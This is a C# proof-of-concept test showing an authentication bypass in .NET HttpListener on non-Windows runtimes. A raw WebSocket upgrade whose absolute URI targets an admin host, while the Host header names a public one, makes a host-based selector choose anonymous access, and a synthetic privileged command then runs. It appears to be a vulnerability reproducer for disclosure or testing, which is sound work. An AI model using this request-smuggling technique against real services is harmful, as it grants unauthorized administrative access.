using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private const string PrivilegedCommand = "EXECUTE_SYNTHETIC_ADMIN_CHANGE";
    private const string CommandSentinel = "ADMIN_WS_PRIVILEGED_COMMAND_EXECUTED_0a61";

    static int FreePort()
    {
        using var l=new TcpListener(IPAddress.Loopback,0);
        l.Start();
        int p=((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    static void Require(bool condition,string message)
    {
        if(!condition) throw new Exception("ASSERTION_FAILED: "+message);
    }

    static byte[] BuildMaskedTextFrame(string text)
    {
        byte[] payload=Encoding.UTF8.GetBytes(text);
        if(payload.Length>125) throw new InvalidOperationException("test frame too large");

        byte[] mask={0x11,0x22,0x33,0x44};
        byte[] frame=new byte[2+4+payload.Length];
        frame[0]=0x81;
        frame[1]=(byte)(0x80|payload.Length);
        Array.Copy(mask,0,frame,2,4);

        for(int i=0;i<payload.Length;i++)
            frame[6+i]=(byte)(payload[i]^mask[i%4]);

        return frame;
    }

    static async Task<byte[]> ReadHttpHeaders(NetworkStream ns)
    {
        using var ms=new MemoryStream();
        byte[] one=new byte[1];
        using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));
        int matched=0;

        while(true)
        {
            int n=await ns.ReadAsync(one,cts.Token);
            if(n==0) break;
            ms.WriteByte(one[0]);

            matched=(matched,one[0]) switch
            {
                (0,13)=>1,
                (1,10)=>2,
                (2,13)=>3,
                (3,10)=>4,
                (_,13)=>1,
                _=>0
            };

            if(matched==4) break;
        }

        return ms.ToArray();
    }

    static async Task<byte[]> ReadRemaining(NetworkStream ns)
    {
        using var ms=new MemoryStream();
        byte[] buf=new byte[4096];
        using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));

        try
        {
            while(true)
            {
                int n=await ns.ReadAsync(buf,cts.Token);
                if(n==0) break;
                await ms.WriteAsync(buf.AsMemory(0,n),cts.Token);

                if(!ns.DataAvailable)
                    await Task.Delay(100,cts.Token);

                if(ms.Length>0 && !ns.DataAvailable)
                    break;
            }
        }
        catch(OperationCanceledException) {}

        return ms.ToArray();
    }

    static async Task<(string firstLine,bool basic,bool context,bool commandExecuted,AuthenticationSchemes selected,string userHost,string urlHost)> Run(bool conflicting)
    {
        int port=FreePort();

        using var listener=new HttpListener();
        listener.Prefixes.Add($"http://public.test:{port}/");
        listener.Prefixes.Add($"http://admin.test:{port}/");
        listener.AuthenticationSchemes=AuthenticationSchemes.None;
        listener.Realm="admin-ws-command";

        AuthenticationSchemes selected=AuthenticationSchemes.None;
        string selectorUserHost="<not-called>";
        string selectorUrlHost="<not-called>";

        listener.AuthenticationSchemeSelectorDelegate=request =>
        {
            selectorUserHost=request.UserHostName ?? "<null>";
            selectorUrlHost=request.Url?.Host ?? "<null>";

            selected=selectorUserHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase)
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine($"SELECTOR UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selected}");
            return selected;
        };

        listener.Start();
        Task<HttpListenerContext> contextTask=listener.GetContextAsync();

        using var client=new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback,port);
        using NetworkStream ns=client.GetStream();

        string target=conflicting ? $"http://admin.test:{port}/ws-command" : "/ws-command";
        string host=conflicting ? $"public.test:{port}" : $"admin.test:{port}";

        string raw=
            $"GET {target} HTTP/1.1\r\n"+
            $"Host: {host}\r\n"+
            "Upgrade: websocket\r\n"+
            "Connection: Upgrade\r\n"+
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
            "Sec-WebSocket-Version: 13\r\n"+
            "\r\n";

        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        Task server=Task.Run(async () =>
        {
            try
            {
                HttpListenerContext ctx=await contextTask.WaitAsync(TimeSpan.FromSeconds(5));
                Console.WriteLine($"CONTEXT UserHostName={ctx.Request.UserHostName} Url.Host={ctx.Request.Url?.Host} User={(ctx.User is null ? "ANONYMOUS":"AUTHENTICATED")} IsWebSocket={ctx.Request.IsWebSocketRequest}");

                if(!ctx.Request.IsWebSocketRequest ||
                   !string.Equals(ctx.Request.Url?.Host,"admin.test",StringComparison.OrdinalIgnoreCase))
                {
                    ctx.Response.StatusCode=400;
                    ctx.Response.Close();
                    return;
                }

                HttpListenerWebSocketContext wsCtx=await ctx.AcceptWebSocketAsync(null);

                byte[] receive=new byte[1024];
                WebSocketReceiveResult rr=await wsCtx.WebSocket.ReceiveAsync(
                    new ArraySegment<byte>(receive),
                    CancellationToken.None);

                string command=Encoding.UTF8.GetString(receive,0,rr.Count);
                Console.WriteLine($"ADMIN_WS_RECEIVED_COMMAND={command}");

                string reply=command==PrivilegedCommand
                    ? CommandSentinel
                    : "COMMAND_REJECTED";

                byte[] replyBytes=Encoding.UTF8.GetBytes(reply);
                await wsCtx.WebSocket.SendAsync(
                    new ArraySegment<byte>(replyBytes),
                    WebSocketMessageType.Text,
                    true,
                    CancellationToken.None);

                await wsCtx.WebSocket.CloseOutputAsync(
                    WebSocketCloseStatus.NormalClosure,
                    "done",
                    CancellationToken.None);
            }
            catch(Exception ex)
            {
                Console.WriteLine($"SERVER_RESULT={ex.GetType().Name}:{ex.Message}");
            }
        });

        byte[] headers=await ReadHttpHeaders(ns);
        string headerText=Encoding.ASCII.GetString(headers);
        string firstLine=headerText.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
        bool basic=headerText.Contains("WWW-Authenticate: Basic",StringComparison.OrdinalIgnoreCase);

        bool contextDelivered=contextTask.IsCompletedSuccessfully;

        if(firstLine.Contains("101",StringComparison.Ordinal))
        {
            byte[] frame=BuildMaskedTextFrame(PrivilegedCommand);
            await ns.WriteAsync(frame);
            await ns.FlushAsync();
        }

        byte[] rest=await ReadRemaining(ns);
        string restAscii=Encoding.ASCII.GetString(rest);
        bool commandExecuted=restAscii.Contains(CommandSentinel,StringComparison.Ordinal);

        await Task.WhenAny(server,Task.Delay(1000));
        listener.Close();

        Console.WriteLine(
            $"RESULT conflicting={conflicting} first={firstLine} basicChallenge={basic} context={contextDelivered} selected={selected} selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} privilegedCommandExecuted={commandExecuted}");

        return(firstLine,basic,contextDelivered,commandExecuted,selected,selectorUserHost,selectorUrlHost);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        var control=await Run(conflicting:false);
        Require(control.firstLine.Contains("401"),"ordinary admin WebSocket must require authentication");
        Require(control.basic,"ordinary admin WebSocket must carry Basic challenge");
        Require(control.selected==AuthenticationSchemes.Basic,"ordinary admin WebSocket selector must choose Basic");
        Require(!control.commandExecuted,"ordinary unauthenticated admin WebSocket must not execute privileged command");

        var attack=await Run(conflicting:true);

        if(OperatingSystem.IsWindows())
        {
            Require(attack.firstLine.Contains("401"),"Windows conflict must require authentication");
            Require(attack.basic,"Windows conflict must carry Basic challenge");
            Require(attack.selected==AuthenticationSchemes.Basic,"Windows selector must choose Basic");
            Require(!attack.commandExecuted,"Windows must not execute privileged WebSocket command");
            Console.WriteLine("ADMIN_WS_COMMAND_WINDOWS_NEGATIVE_CONTROL=PASS");
        }
        else
        {
            Require(attack.firstLine.Contains("101"),"managed conflict must establish WebSocket");
            Require(!attack.basic,"managed conflict must omit Basic challenge");
            Require(attack.selected==AuthenticationSchemes.Anonymous,"managed selector must choose Anonymous");
            Require(attack.userHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase),
                "selector must see stale public Host");
            Require(string.Equals(attack.urlHost,"admin.test",StringComparison.OrdinalIgnoreCase),
                "selector must simultaneously see admin Url authority");
            Require(attack.commandExecuted,
                "privileged command sent over bypassed admin WebSocket must execute");

            Console.WriteLine("ADMIN_WS_PRIVILEGED_COMMAND_AUTH_BYPASS=CONFIRMED");
        }
    }
}
